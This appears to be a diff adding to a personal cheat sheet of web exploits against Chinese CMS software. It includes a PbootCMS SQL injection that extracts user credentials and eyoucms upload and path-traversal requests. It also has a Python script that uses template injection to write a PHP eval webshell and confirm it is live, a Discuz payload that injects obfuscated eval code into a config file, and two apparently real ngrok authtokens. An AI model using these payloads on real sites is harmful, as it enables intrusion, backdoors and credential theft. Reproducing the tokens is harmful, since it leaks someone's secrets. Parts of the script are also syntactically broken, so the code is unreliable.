@@ -11,6 +11,120 @@ PbootCMS/index.php?p=search【data】1=select 1  |1=select 0 判断 使用sqlmap
 
 SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1)
 
+eyoucms
+<?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==
+/index.php/api/Uploadify/preview【data】data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
+eyoucms/login.php?m=admin&c=Filemanager&a=newfile&lang=cn[headers]Accept::text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&&Content-Type::application/x-www-form-urlencoded&&Referer::http://127.0.0.1/eyoucms/login.php?m=admin&c=Filemanager&a=newfile&activepath=%3Atemplate%3Aplugins%3Atest&lang=cn&&Cookie::home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705【data】 activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&filename=newfile.htm&content=test
+
+#!/usr/bin/python
+ -*- coding: UTF-8 -*-
+import requests
+import sys,getopt
+import json,base64
+import time
+
+class Eyoucms:
+    session = None
+    headers = None
+    password = "ceshi"
+    output = "ceshi"
+    requesturi = "/?m=api&c=ajax&a=get_tag_memberlist"
+    def __init__(self,headers):
+        self.headers = headers
+        self.getparam(sys.argv[1:])
+        self.requestsdata = {
+            "attarray":self.createpyload(),
+            "htmlcode":time.time()
+        }
+        self.run()
+    def getparam(self,argv):
+        try:
+            options, args = getopt.getopt(argv, "h:u:p:o:", ["help", "url=","password=","output="])
+        except getopt.GetoptError:
+            print 'eyoucms-ssti.py -u url -p password -o outputfile'
+            return
+        for option, value in options:
+            if option in ("-h", "--help"):
+                print 'eyoucms-ssti.py -u url'
+            if option in ("-u", "--url"):
+                if(self.request(value).status_code != 404):
+                    self.url = value
+            if option in ("-p", "--password"):
+                    if(value != None):
+                        self.password = value
+                    else:
+                        self.password = "ceshi"
+            if option in ("-o", "--output"):
+                    if(value != None):
+                        self.output = value.replace(".php","")
+                    else:
+                        self.output = "ceshi"
+    def run(self):
+        url = self.url.rstrip('/')+self.requesturi
+        print "[+] 正在请求目标地址:%s"%(url)
+        if(self.request(url).status_code == 200):
+            print "
+ 目标地址%s存活"%url
+
+        else:
+            print "[-] 目标地址%s探测失败"%url
+            return
+        print "[+] 正在向目标地址%s写入%s.php"%(url,self.output)
+
+        if(self.request(url,"post").status_code == 200):
+            print "
+ 疑似成功写入Webshell"
+        shell = self.url.rstrip('/')+"/%s.php"%self.output
+        print "[+] 正在探测Webshell(%s)是否存活"%(shell)
+         if(self.request(shell).status_code == 200):
+            print "
+ Webshell(%s)已存活\n
+ 密码：%s"%(shell,self.password)
+    def createpyload(self):
+        short = base64.b64encode("<php eval($_REQUEST[%s]);?>"%self.password)
+        file = self.output
+        payload = {
+            "{php}1{/php}":"{php}file_put_contents('./%s.php',base64_decode('%s'));{/php}"%(file,short)
+        }
+        return base64.b64encode(json.dumps(payload))
+    def request(self,url,method="get"):
+        respone = None
+        if(not self.session):
+            self.session = requests.Session()
+        if(method == "get"):
+            try:
+                respone = self.session.get(url=url,headers=self.headers)
+            except requests.exceptions.ConnectTimeout:
+                print "[-] 请求%s超时"%url
+                return
+            except requests.exceptions.ConnectionError:
+                print "[-] 请求%s无效"%url
+                return
+            return respone
+        elif(method == "post"):
+            try:
+                respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers)
+            except requests.exceptions.ConnectTimeout:
+                print "[-] 请求%s超时"%url
+                return
+            except requests.exceptions.ConnectionError:
+                print "[-] 请求%s无效"%url
+                return
+        return respone
+
+if __name__ == "__main__":
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
+        "X-Requested-With":"XMLHttpRequest"
+    }
+    Eyoucms(headers)
+
+
+discuz
+lanvna=
+/dz/utility/convert/index.php[data]a=config&source=d7.2_x1.5&submit=yes&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa
+
+
 ngrok config add-authtoken 2eWvRxll3u2mUA2eK5XhrKHeIWn_4fz7StZCtXPrdJ6qnAh2U
 ngrok config add-authtoken 2eWyFLT4oZEbuVwxwkszPIaR7uM_2BNy6EvMcjn1B5RdcHBiR
 https://beneri.se/uploads/
